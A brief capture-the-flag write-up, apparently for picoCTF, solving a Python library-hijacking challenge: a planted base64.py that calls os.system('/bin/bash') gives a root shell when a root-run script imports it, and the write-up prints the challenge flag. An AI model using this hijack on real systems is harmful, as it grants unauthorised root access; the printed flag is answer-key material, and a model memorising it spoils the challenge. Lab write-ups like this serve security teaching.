Can run a python file as root.

Checking the sys path in python shows that the current directory is first, which is bad.

So just build a new library and then run that as root. Something like:

base64.py
```
import os
os.system("/bin/bash")
```

Run the file and get the `/root/.flag.txt`
```
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}
```